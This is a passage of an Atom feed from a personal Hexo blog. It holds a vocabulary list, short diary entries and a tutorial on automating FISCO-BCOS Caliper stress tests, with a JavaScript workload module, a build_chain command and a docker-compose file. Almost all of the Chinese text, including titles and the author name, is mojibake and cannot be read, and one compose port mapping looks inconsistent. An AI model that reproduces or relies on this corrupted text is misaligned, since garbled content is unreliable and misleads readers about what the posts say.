<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>XiaoYue</title>
  
  <subtitle>ä»¥æ¢¦ä¸ºé©¬,ä¸è´ŸéŸ¶å</subtitle>
  <link href="https://x1a0.net/atom.xml" rel="self"/>
  
  <link href="https://x1a0.net/"/>
  <updated>2022-07-08T19:05:34.099Z</updated>
  <id>https://x1a0.net/</id>
  
  <author>
    <name>è‚–è¶Š</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>å± é¸­æ—¥è®°1</title>
    <link href="https://x1a0.net/2022/07/08/%E5%B1%A0%E9%B8%AD%E6%97%A5%E8%AE%B01/"/>
    <id>https://x1a0.net/2022/07/08/%E5%B1%A0%E9%B8%AD%E6%97%A5%E8%AE%B01/</id>
    <published>2022-07-08T12:33:08.000Z</published>
    <updated>2022-07-08T19:05:34.099Z</updated>
    
    <content type="html"><![CDATA[<p>è¯æ±‡é‡1000<br>2020å¹´7æœˆ8æ—¥</p><hr><p>å¿½ç•¥ï¼Œæ— è§†<br>ignore, neglect, overlook, pay no attention</p><p>æ¯å<br>destruction, destroy, damage</p><p>é”™è¯¯çš„è§‚ç‚¹<br>misconception, inaccurate view, mistaken view</p><p>å®¹æ˜“è¾¾åˆ°çš„<br>accessible, approachable, easy to reach</p><p>æ£€æŸ¥ï¼Œè°ƒæŸ¥<br>investigate, inquiry, enquiry, survey, inspect, detect, probe, dig into, look into</p><p>è¡¨åœ°ç‚¹<br>where, place, spot, geographical location</p><p>åŸå› <br>reason, cause, factor, because of, due to, thanks to, as a result of, as a consequence of, result from</p><p>ä¿æŠ¤<br>protect, guard, safeguard, shield, preserve, conservation</p><p>åª’ä½“<br>newspaper, medium, press</p><p>å˜æš–<br>calefy, get warmer, global warming</p><p>é­é‡ï¼Œé¢å¯¹<br>encounter, confront, suffer, face, sustain, run up against</p><p>æ”¹å˜<br>revision, change, alter, turn, modify, conversation, alteration</p><p>é‡è¦çš„<br>key, essential, primary, dominant, vital, important, significant, monumental, critical, imperative, fundamental, crucial</p><p>çƒ¦æ­»äº† è¿™ä¸ªpinata è¿™ä¸ªæŠ¤ç½‘ è€½è¯¯æ‰å¥½å¤šæ—¶é—´</p><p>ä¸çœ‹æŠ–éŸ³</p><p>ä¸çœ‹æŠ–éŸ³</p><p>ä¸çœ‹æŠ–éŸ³</p><p>ï¼ï¼ï¼</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;è¯æ±‡é‡1000&lt;br&gt;2020å¹´7æœˆ8æ—¥&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;å¿½ç•¥ï¼Œæ— è§†&lt;br&gt;ignore, neglect, overlook, pay no attention&lt;/p&gt;
&lt;p&gt;æ¯å&lt;br&gt;destruction, destroy, damage&lt;/p&gt;
&lt;p&gt;é”™è¯¯</summary>
      
    
    
    
    
    <category term="å± é¸­" scheme="https://x1a0.net/tags/%E5%B1%A0%E9%B8%AD/"/>
    
  </entry>
  
  <entry>
    <title>2022.5.28æ—¥è®°</title>
    <link href="https://x1a0.net/2022/05/28/2022-5-28%E6%97%A5%E8%AE%B0/"/>
    <id>https://x1a0.net/2022/05/28/2022-5-28%E6%97%A5%E8%AE%B0/</id>
    <published>2022-05-27T16:42:43.000Z</published>
    <updated>2022-05-27T16:51:04.277Z</updated>
    
    <content type="html"><![CDATA[<p>ä»Šå¤©æ˜¯2022å¹´5æœˆ28å·</p><p>æŒºæç¬‘çš„ä¸€ä»¶äº‹ï¼Œä¸çŸ¥é“èƒ½ä¸èƒ½åœ¨åšå®¢é‡Œå†™å“ˆå“ˆå“ˆã€‚</p><p>ç°åœ¨æ˜¯å‡Œæ™¨00:43ï¼Œæœ¬æ¥è¦è·Ÿé¡¹ç›®æ–¹äº¤ä¸œè¥¿çš„ï¼Œå…ˆå†™ä¸ªæ—¥è®°å¹³å¤ä¸‹å¿ƒæƒ…å§ã€‚</p><p>æœ‰ä¸ªå°ä¼™å­è¯´è¦æ¥æ•™æˆ‘åšäººï¼Œæˆ‘ä»¥ä¸ºæœ‰äºŒä¸‰åä¸ªï¼Œæ²¡æƒ³åˆ°ä¸€ä¸ªäººæ¥äº†ã€‚ä¸çŸ¥é“è¯¥ä¸è¯¥æŠ¥è­¦ï¼Œè¯¥è¯´ä¸è¯´æŠ¥è­¦æœ‰ç‚¹æ€‚ã€‚ã€‚å“ˆå“ˆå“ˆï¼Œä½†è¦æ˜¯æœ‰äººçœ‹åˆ°è¿™ç¯‡æ—¥è®°ä¸€å®šè®°å¾—ï¼Œè¿™ç§æƒ…å†µå¾—æŠ¥è­¦ã€‚å†²è¿›æ¥å°±å˜ç€æˆ‘è„–å­ï¼Œæˆ‘åæ‰‹æŠ“èµ·åŒèŠ‚æ£å°±æ˜¯ä¸€æŒ¥ã€‚æœ€åä»–ç°æºœæºœçš„èµ°äº†ã€‚</p><p>ç°åœ¨é—®é¢˜å§ï¼Œå°±æ˜¯æ€•ä»–ç™¾æŠ˜ä¸æŒ çš„æ¥æ‰¾æˆ‘æŠ¥å¤ï¼Œæ˜ç€æ¥ä¸æ€•ï¼Œå°±æ€•å†·ä¸ä¼¶ä»ƒçš„èƒŒåæ¥ä¸€åˆ€ã€‚å“ˆå“ˆå“ˆã€‚è¿™ç§äº‹æƒ…ä¹Ÿæ˜¯å¯èƒ½å‘ç”Ÿçš„å˜›ï¼Œè¦æ˜¯æˆ‘å“ªå¤©ä¸åœ¨äº†ï¼Œå¤§å®¶ä¸€å®šè¦æ¥ç¿»çœ‹è¿™ç¯‡åšå®¢ã€‚ï¼ˆæ‰‹åŠ¨æ‚è„¸ï¼‰</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;ä»Šå¤©æ˜¯2022å¹´5æœˆ28å·&lt;/p&gt;
&lt;p&gt;æŒºæç¬‘çš„ä¸€ä»¶äº‹ï¼Œä¸çŸ¥é“èƒ½ä¸èƒ½åœ¨åšå®¢é‡Œå†™å“ˆå“ˆå“ˆã€‚&lt;/p&gt;
&lt;p&gt;ç°åœ¨æ˜¯å‡Œæ™¨00:43ï¼Œæœ¬æ¥è¦è·Ÿé¡¹ç›®æ–¹äº¤ä¸œè¥¿çš„ï¼Œå…ˆå†™ä¸ªæ—¥è®°å¹³å¤ä¸‹å¿ƒæƒ…å§ã€‚&lt;/p&gt;
&lt;p&gt;æœ‰ä¸ªå°ä¼™å­è¯´è¦æ¥æ•™æˆ‘åšäººï¼Œæˆ‘ä»¥ä¸ºæœ‰äºŒä¸‰åä¸ªï¼Œæ²¡æƒ³åˆ°ä¸€ä¸ªäººæ¥äº†ã€‚ä¸çŸ¥é“è¯¥ä¸è¯¥æŠ¥è­¦ï¼Œè¯¥è¯´</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>2022.5.9æ—¥è®°</title>
    <link href="https://x1a0.net/2022/05/09/2022-5-9%E6%97%A5%E8%AE%B0/"/>
    <id>https://x1a0.net/2022/05/09/2022-5-9%E6%97%A5%E8%AE%B0/</id>
    <published>2022-05-09T12:10:46.000Z</published>
    <updated>2022-05-09T12:34:22.987Z</updated>
    
    <content type="html"><![CDATA[<p>å¥½ä¹…æ²¡è·Ÿæ–°åšå®¢äº†ï¼Œåˆšæ‰“å¼€å¾®ä¿¡çœ‹åˆ°x1a0.netè¿™ä¸ªåŸŸåæ‰å‘ç°ï¼ŒåŸæ¥æˆ‘è¿˜æœ‰ä¸ªåšå®¢ã€‚</p><p>ä¸æƒ³å†™ä¸œè¥¿çš„åŸå› æœ‰å¾ˆå¤šå§ï¼Œå¤ªå¿™ã€å¤ªç´¯ã€å¤ªéº»çƒ¦ã€‚ æ©ï¼Œæˆ‘ä»¬å¥½åƒæ€»èƒ½ç»™ä¸æƒ³åšçš„äº‹æƒ…æ‰¾åˆ°å¾ˆå¤šåŸå› ã€‚<br>ä¹Ÿå¯èƒ½æ˜¯æ„Ÿè§‰æ ‡ç­¾å’Œåˆ†ç±»å¤ªéš¾æäº†ã€‚</p><p>æœ€è¿‘ä¸€ç›´å¤±çœ ï¼Œé€šå®µã€‚ä¸çŸ¥é“å•¥åŸå› ä½†æ˜¯å·²ç»å¥½å¤šå¤©æ²¡ä¸Šè¿‡è¯¾äº†ã€‚</p><p>é‡æ¸©ä¸€ä¸‹äº†scorpionï¼Œä¸é”™çš„ç¾å‰§ï¼Œä¸€æ—¶å…´èµ·åˆæƒ³ç ”ç©¶çŸ­æ³¢é€šä¿¡äº†ã€‚</p><p>å¥½å›°ï¼ŒèƒŒå•è¯å»äº†ã€‚</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;å¥½ä¹…æ²¡è·Ÿæ–°åšå®¢äº†ï¼Œåˆšæ‰“å¼€å¾®ä¿¡çœ‹åˆ°x1a0.netè¿™ä¸ªåŸŸåæ‰å‘ç°ï¼ŒåŸæ¥æˆ‘è¿˜æœ‰ä¸ªåšå®¢ã€‚&lt;/p&gt;
&lt;p&gt;ä¸æƒ³å†™ä¸œè¥¿çš„åŸå› æœ‰å¾ˆå¤šå§ï¼Œå¤ªå¿™ã€å¤ªç´¯ã€å¤ªéº»çƒ¦ã€‚ æ©ï¼Œæˆ‘ä»¬å¥½åƒæ€»èƒ½ç»™ä¸æƒ³åšçš„äº‹æƒ…æ‰¾åˆ°å¾ˆå¤šåŸå› ã€‚&lt;br&gt;ä¹Ÿå¯èƒ½æ˜¯æ„Ÿè§‰æ ‡ç­¾å’Œåˆ†ç±»å¤ªéš¾æäº†ã€‚&lt;/p&gt;
&lt;p&gt;æœ€è¿‘ä¸€ç›´å¤±çœ ï¼Œé€šå®µã€‚ä¸çŸ¥é“å•¥</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Ubuntu-install-Oracle</title>
    <link href="https://x1a0.net/2022/02/26/Ubuntu-install-Oracle/"/>
    <id>https://x1a0.net/2022/02/26/Ubuntu-install-Oracle/</id>
    <published>2022-02-25T17:56:14.000Z</published>
    <updated>2022-02-25T17:56:14.083Z</updated>
    
    
    
    
    
  </entry>
  
  <entry>
    <title>FISCO-BCOS Caliperå‹æµ‹è‡ªåŠ¨åŒ–è„šæœ¬</title>
    <link href="https://x1a0.net/2022/01/17/FISCO-BCOS%20Caliper%E5%8E%8B%E6%B5%8B%E8%87%AA%E5%8A%A8%E5%8C%96%E8%84%9A%E6%9C%AC/"/>
    <id>https://x1a0.net/2022/01/17/FISCO-BCOS%20Caliper%E5%8E%8B%E6%B5%8B%E8%87%AA%E5%8A%A8%E5%8C%96%E8%84%9A%E6%9C%AC/</id>
    <published>2022-01-16T16:14:34.000Z</published>
    <updated>2022-01-20T02:10:41.377Z</updated>
    
    <content type="html"><![CDATA[<p>æ˜¯åœ¨ä¸€æ¬¡é¡¹ç›®ä¸­é‡åˆ°çš„é—®é¢˜:</p><ol><li>éœ€è‡ªå®šä¹‰åˆçº¦å‡½æ•°å‹æµ‹</li><li>éœ€è‡ªå®šä¹‰é“¾èŠ‚ç‚¹æ•°é‡</li><li>å¿…é¡»ä½¿ç”¨Dockeræ¨¡å¼æ­é“¾</li><li>DockerèŠ‚ç‚¹éœ€è¦è‡ªå®šä¹‰é…ç½®(CPUã€å†…å­˜ç­‰)</li></ol><p>é‚£ä¹ˆä½œä¸ºFiscoBcosç¤¾åŒºå…‰è£çš„ä¸€ä»½å­å‘¢ï¼Œå†³å®šæŠŠè¿™æ¬¡é—®é¢˜è®°å½•ä¸‹æ¥ï¼Œå¹¶å…¬å¼€è‡ªåŠ¨åŒ–è„šæœ¬ã€‚<br>åˆ†å‡ èŠ‚å†™äº†é—®é¢˜è§£å†³æ–¹æ¡ˆï¼Œè„šæœ¬åœ¨æœ€åã€‚æ±‚ä¸ªStart~</p><p>æ„Ÿè§‰é¦–å…ˆéœ€è¦äº†è§£è¿™ä¸‰ä¸ªæ–‡ä»¶ï¼š</p><ul><li>åŸºå‡†é…ç½®æ–‡ä»¶ â€”â€” config.yaml <code>æŒ‡å®šæµ‹è¯•é€Ÿç‡ï¼Œå·¥ä½œè´Ÿè½½æ¨¡å—è·¯å¾„ç­‰</code></li><li>åŸºå‡†ç½‘ç»œé…ç½®æ–‡ä»¶ â€”â€” fisco-bcos.json <code>æµ‹è¯•çš„ç¯å¢ƒä¸åŒå°±ä¸ä¸€æ ·</code></li><li>å·¥ä½œè´Ÿè½½æ¨¡å—æ–‡ä»¶ â€”â€” workload.js <code>éšä¾¿å‘½åï¼Œå†™å“ªéƒ½è¡Œ</code></li></ul><hr><h3 id="ã€1ã€è‡ªå®šä¹‰æµ‹å‹åˆçº¦"><a href="#ã€1ã€è‡ªå®šä¹‰æµ‹å‹åˆçº¦" class="headerlink" title="ã€1ã€è‡ªå®šä¹‰æµ‹å‹åˆçº¦"></a>ã€1ã€è‡ªå®šä¹‰æµ‹å‹åˆçº¦</h3><p>ä½¿ç”¨è‡ªå®šä¹‰åˆçº¦è¿›è¡Œå‹æµ‹æ˜¯éœ€è¦ç¼–å†™å·¥ä½œè´Ÿè½½æ¨¡å—çš„ï¼Œè¿™ä¸ªã“ç›´æ¥æœç”¨ ğŸ‘‰ğŸ»<a href="https://fisco-bcos-documentation.readthedocs.io/zh_CN/latest/docs/tutorial/stress_testing.html">FiscoBcoså…³äºcaliperæµ‹å‹çš„å®˜æ–¹æ–‡æ¡£</a> ï¼Œæ‰§è¡Œå®ŒåæŸ¥çœ‹ä¾‹å­å…¶å®å°±å¤§æ¦‚çŸ¥é“æ€ä¹ˆç¼–å†™äº†ã€‚å¦‚æœéœ€è¦æ·±å…¥äº†è§£è¯·çœ‹ ğŸ‘‰ğŸ»<a href="https://hyperledger.github.io/caliper/v0.4.2/workload-module/#example">å®˜æ–¹æ–‡æ¡£</a> è¿™é‡Œå°±å¤§æ¦‚æä¸€ä¸‹ï¼ŒåŸºæœ¬æ”¹åŠ¨å°±æ˜¯å‡½æ•°è¾“å…¥éƒ¨åˆ†ã€‚</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">generateWorkload</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> workload = [];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; txnPerBatch; i++) &#123;</span><br><span class="line">        <span class="keyword">let</span> w = &#123;</span><br><span class="line">            <span class="string">&#x27;transaction_type&#x27;</span>: <span class="string">&#x27;set(string)&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;hello! - from &#x27;</span> + process.pid.toString(),</span><br><span class="line">        &#125;;</span><br><span class="line">        workload.push(w);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> workload;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports.run = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> args = generateWorkload();</span><br><span class="line">    <span class="keyword">return</span> bc.invokeSmartContract(contx, <span class="string">&#x27;helloworld&#x27;</span>, <span class="string">&#x27;v0&#x27;</span>, args, <span class="literal">null</span>);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>ç”±äºé¡¹ç›®ä¸èƒ½å…¬å¼€ï¼Œæ‰€ä»¥æ‹¿æ¨¡æ¿å®ä¾‹ä¸­çš„hellowordä½œä¸ºä¾‹å­ã€‚<br>è¿™é‡ŒtxnPerBatchä»£è¡¨æ¯ä¸€æ‰¹æ¬¡æ‰§è¡Œå¤šå°‘æ¬¡setå‡½æ•°ã€‚  </p><p>ä¾‹å­ä¸­txnPerBatchæ˜¯ç­‰äº1çš„ï¼Œå¯ä»¥åœ¨generateWorkload()å‡½æ•°ä¸­çœ‹åˆ°å¾€workloadä¸­å­˜å…¥äº†txnPerBatchç¬”äº¤æ˜“ï¼Œæœ€åé€šè¿‡ä¼ å…¥çš„é€‚é…å™¨å®ä¾‹bc.invokeSmartContractè°ƒç”¨åˆçº¦ã€‚ä¸€æ‰¹æ¬¡æ‰§è¡Œå¤šæ¬¡è¿˜æ²¡æµ‹è¯•è¿‡ï¼Œä¸è¿‡é¡¹ç›®ç”¨ä¸åˆ°ã€‚ </p><p>å¦‚æœå’Œæˆ‘ä¸€æ ·åªéœ€è¦ä¸€æ‰¹æ¬¡æ‰§è¡Œä¸€æ¬¡ï¼Œé‚£ä¹ˆåªè¦ç»™invokeSmartContractçš„ç¬¬å››ä¸ªå‚æ•°ä¼ ä¸ªdictå°±è¡Œäº†ï¼Œå¯ä»¥ç›´æ¥å®šä¹‰éœ€è¦çš„æ•°æ®ç±»å‹ï¼š</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> sendRrgs = &#123;</span><br><span class="line">            <span class="string">&#x27;transaction_type&#x27;</span>:<span class="string">&#x27;_set_(address,bytes32,uint256,uint256,uint256)&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;_addr&#x27;</span>: <span class="string">&#x27;hello! - from &#x27;</span> + process.pid.toString()</span><br><span class="line">            <span class="comment">// ...</span></span><br><span class="line">        &#125;;</span><br><span class="line"><span class="keyword">return</span> bc.invokeSmartContract(contx, <span class="string">&#x27;helloworld&#x27;</span>, <span class="string">&#x27;v0&#x27;</span>, sendRrgs, <span class="literal">null</span>);</span><br></pre></td></tr></table></figure><p>ç„¶ååœ¨æµ‹è¯•æ–‡ä»¶config.yamlçš„å›è°ƒå‡½æ•°æ å¡«ä¸Šæ­¤å·¥ä½œè´Ÿè½½æ¨¡å—ä½ç½®å³å¯ã€‚  </p><hr><h3 id="ã€2ã€è‡ªå®šä¹‰èŠ‚ç‚¹æ•°é‡"><a href="#ã€2ã€è‡ªå®šä¹‰èŠ‚ç‚¹æ•°é‡" class="headerlink" title="ã€2ã€è‡ªå®šä¹‰èŠ‚ç‚¹æ•°é‡"></a>ã€2ã€è‡ªå®šä¹‰èŠ‚ç‚¹æ•°é‡</h3><p>ç”±äºæ¯æ¬¡å‹æµ‹éœ€è¦ä¸åŒçš„èŠ‚ç‚¹æ•°é‡ï¼Œä¸€ä¸‹4ä¸ªä¸€ä¸‹100ä¸ªï¼Œè¿™ä¸ªæ—¶å€™å°±éœ€è¦ä½¿ç”¨build_chainè„šæœ¬ç”Ÿæˆå…·æœ‰ç›¸åº”èŠ‚ç‚¹çš„é“¾ã€‚å¤§è‡´è®°å½•ä¸‹ï¼Œéœ€è¦æ·±å…¥äº†è§£è¯·çœ‹ ğŸ‘‰ğŸ»<a href="https://fisco-bcos-documentation.readthedocs.io/zh_CN/latest/docs/manual/build_chain.html">FISCOå¼€å‘éƒ¨ç½²å·¥å…·å®˜æ–¹æ–‡æ¡£</a> .</p><p>è¿™é‡Œæœ‰ä¸ªå‘ï¼Œå¦‚æœä½¿ç”¨2.8.0ç‰ˆæœ¬æ­é“¾å°±ä¼šæŠ¥é”™ï¼Œå› ä¸ºä¸å…¼å®¹ã€‚å½“æ—¶æŸ¥äº†å¥½ä¹…ä¸èƒ½å…±è¯†çš„åŸå› ï¼Œæ²¡æƒ³åˆ°æ˜¯ä¸å…¼å®¹ã€‚ğŸ˜Œå®˜æ–¹æ•™ç¨‹ä¹Ÿæ˜¯æ¨èdockeræ­å»ºçš„ï¼Œä½†æ˜¯åœ¨ç»™åˆ°build_chainé“¾æ¥çš„æ—¶å€™å¹¶æ²¡æœ‰æ³¨æ˜ç‰ˆæœ¬ï¼Œæ˜¯ä¸ªå‘ã€‚</p><p>ç»æµ‹è¯•2.7.2æ˜¯å¯ä»¥å®Œç¾è¿è¡Œçš„ï¼š ğŸ‘‰ğŸ»<a href="https://gitee.com/FISCO-BCOS/FISCO-BCOS/blob/v2.7.2/tools/build_chain.sh">ä¸‹è½½åœ°å€</a></p><p>ä¸‹é¢æ˜¯å¤šèŠ‚ç‚¹å•ç¾¤ç¥–é…ç½®æ–¹æ³•ï¼Œç”±äºæœºå™¨ä¸Šè¿˜æœ‰åˆ«çš„èŠ‚ç‚¹å ç”¨ç«¯å£ï¼Œæ‰€ä»¥é€‰ç”¨äº†30700,20700,7545</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash build_chain.sh -l 127.0.0.1:n -p 30700,20700,7545</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨dockeræ­é“¾çš„è¯ä¸ºäº†æ›´å¥½çš„å¯åŠ¨è¿™äº›èŠ‚ç‚¹ï¼Œéœ€è¦å†™ä¸€ä¸ªdocker-compose.yamlï¼Œç¬”è€…æ˜¯å®¹å™¨å°ç™½ï¼Œé˜Ÿé‡Œå¤§ä½¬å·²ç»å†™å¥½äº†ï¼Œè§ä¸‹èŠ‚ã€‚</p><hr><h3 id="ã€3ã€ä½¿ç”¨dockeræ­é“¾"><a href="#ã€3ã€ä½¿ç”¨dockeræ­é“¾" class="headerlink" title="ã€3ã€ä½¿ç”¨dockeræ­é“¾"></a>ã€3ã€ä½¿ç”¨dockeræ­é“¾</h3><p>ç”±äºè¿™æ¬¡é¡¹ç›®éœ€è¦å¯¹å‹æµ‹èŠ‚ç‚¹è¿›è¡Œç›‘æ§ï¼Œæ‰€ä»¥å¿…é¡»ä½¿ç”¨dockerè¿›è¡Œå‹æµ‹ã€‚åœ¨å®˜æ–¹æ•™ç¨‹é‡Œä¹Ÿæ˜¯æ¨èä½¿ç”¨dockeræ­é“¾ï¼Œä¸‹é¢ç®€è¿°ä¸‹æµç¨‹ã€‚</p><p>ä¸Šé¢å·²ç»ç”Ÿæˆäº†ç›¸åº”çš„èŠ‚ç‚¹ï¼Œè¿™ä¸ªæ—¶å€™ä½¿ç”¨dockerå¯åŠ¨å³å¯ï¼š</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">&quot;3&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line">  <span class="attr">node0:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">fiscoorg/fiscobcos:latest</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;20700:20700&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;7545:7545&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;30700:30700&quot;</span></span><br><span class="line">    <span class="attr">working_dir:</span> <span class="string">/data</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">./node0:/data</span></span><br><span class="line">    <span class="attr">deploy:</span></span><br><span class="line">      <span class="attr">resources:</span></span><br><span class="line">        <span class="attr">limits:</span></span><br><span class="line">          <span class="attr">cpus:</span> <span class="string">&#x27;0.1&#x27;</span></span><br><span class="line">          <span class="attr">memory:</span> <span class="string">240M</span></span><br><span class="line">        <span class="attr">reservations:</span></span><br><span class="line">          <span class="attr">cpus:</span> <span class="string">&#x27;0.1&#x27;</span></span><br><span class="line">          <span class="attr">memory:</span> <span class="string">200M</span></span><br><span class="line">    <span class="attr">container_name:</span> <span class="string">node0</span></span><br><span class="line">    <span class="attr">command:</span> <span class="string">/usr/local/bin/fisco-bcos</span> <span class="string">-c</span> <span class="string">config.ini</span></span><br><span class="line"> </span><br><span class="line">  <span class="attr">node1:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">fiscoorg/fiscobcos:latest</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;20701:20702&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;7546:7546&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;30701:30701&quot;</span></span><br><span class="line">    <span class="attr">working_dir:</span> <span class="string">&quot;/data&quot;</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">./node1:/data</span></span><br><span class="line">    <span class="attr">deploy:</span> </span><br><span class="line">      <span class="attr">resources:</span> </span><br><span class="line">        <span class="attr">limits:</span> </span><br><span class="line">          <span class="attr">cpus:</span> <span class="string">&#x27;0.1&#x27;</span> </span><br><span class="line">          <span class="attr">memory:</span> <span class="string">240M</span></span><br><span class="line">        <span class="attr">reservations:</span> </span><br><span class="line">          <span class="attr">cpus:</span> <span class="string">&#x27;0.1&#x27;</span> </span><br><span class="line">          <span class="attr">memory:</span> <span class="string">200M</span></span><br><span class="line">    <span class="attr">container_name:</span> <span class="string">node1</span></span><br><span class="line">    <span class="attr">command:</span> <span class="string">/usr/local/bin/fisco-bcos</span> <span class="string">-c</span> <span class="string">config.ini</span></span><br><span class="line">    <span class="attr">depends_on:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;node0&quot;</span></span><br></pre></td></tr></table></figure><p>å¯åŠ¨å’Œç»“æŸå‘½ä»¤ï¼šï¼ˆå†™åœ¨fisco-bocs.jsonä¸­commonå­—æ®µä¸‹ï¼‰</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;start&quot;</span>: <span class="string">&quot;docker-compose -f docker-compose.yaml up -d; sleep 3s&quot;</span>,</span><br><span class="line"><span class="string">&quot;end&quot;</span>: <span class="string">&quot;docker-compose -f docker-compose.yaml down&quot;</span></span><br></pre></td></tr></table></figure><p>ä»¥ä¸Šå‘½ä»¤ã“å¯åŠ¨å…·æœ‰ç›¸åº”CPUå’Œå†…å­˜çš„dockerèŠ‚ç‚¹ï¼Œå¹¶æŠŠæ•°æ®æŒ‚è½½åˆ°ç›¸åº”èŠ‚ç‚¹dataç›®å½•ä¸‹ã€‚<br><strong>éœ€è¦ç‰¹åˆ«æ³¨æ„çš„æ˜¯å‡ ä¸ªç›®å½•</strong>  </p><ol><li><strong>èŠ‚ç‚¹æ–‡ä»¶ç›®å½•[éœ€è¦åœ¨docker-composeæ–‡ä»¶çš„volumesä¸‹æŒ‡å®šæŠŠè¿™ä¸ªç›®å½•æŒ‚è½½åˆ°å®¹å™¨ä¸­çš„/dataç›®å½•ä¸‹]</strong>  </li><li><strong>config.yamlæ–‡ä»¶ç›®å½•[å¯åŠ¨caliperæ—¶éœ€è¦æŒ‡å®š]</strong></li><li><strong>fisco-bcos.josnæ–‡ä»¶ç›®å½•[å¯åŠ¨caliperæ—¶éœ€è¦æŒ‡å®š]</strong></li><li><strong>workloadæ–‡ä»¶ç›®å½•[éœ€è¦åœ¨config.yamlæ–‡ä»¶ä¸­æŒ‡å®š]</strong></li></ol><hr><h3 id="ã€4ã€ä¸€åŠ³æ°¸é€¸"><a href="#ã€4ã€ä¸€åŠ³æ°¸é€¸" class="headerlink" 